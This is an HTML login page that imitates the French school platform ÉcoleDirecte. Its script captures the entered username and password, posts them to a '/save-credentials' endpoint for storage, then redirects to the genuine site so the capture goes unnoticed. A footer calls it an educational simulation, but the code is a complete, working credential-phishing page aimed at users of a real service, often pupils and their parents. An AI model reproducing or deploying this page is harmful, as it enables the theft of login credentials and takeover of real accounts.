<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion-EcoleDirecte</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f0f4f8;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 400px;
        }
        .login-container h1 {
            margin-bottom: 20px;
            color: #2c3e50;
        }
        .login-container input {
            width: 90%;
            margin: 10px 0;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-container button {
            width: 90%;
            padding: 10px;
            font-size: 16px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #2980b9;
        }
        .footer {
            margin-top: 10px;
            font-size: 12px;
            color: #7f8c8d;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Connexion</h1>
        <form onsubmit="handleLogin(event)">
            <input type="text" id="username" placeholder="Identifiant" required>
            <input type="password" id="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <div class="footer">
            <p>Simulation d'ÉcoleDirecte pour un projet éducatif</p>
        </div>
    </div>

    <script>
        async function handleLogin(event) {
            event.preventDefault();

            // Récupérer les valeurs des champs
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Enregistrer dans un fichier sur votre système via une requête vers le serveur local
            const response = await fetch('/save-credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });

            if (response.ok) {
                alert('Informations enregistrées avec succès.');
            } else {
                alert('Erreur lors de l\'enregistrement des informations.');
            }

            // Rediriger vers ÉcoleDirecte
            window.location.href = "https://www.ecoledirecte.com";
        }
    </script>
</body>
</html>
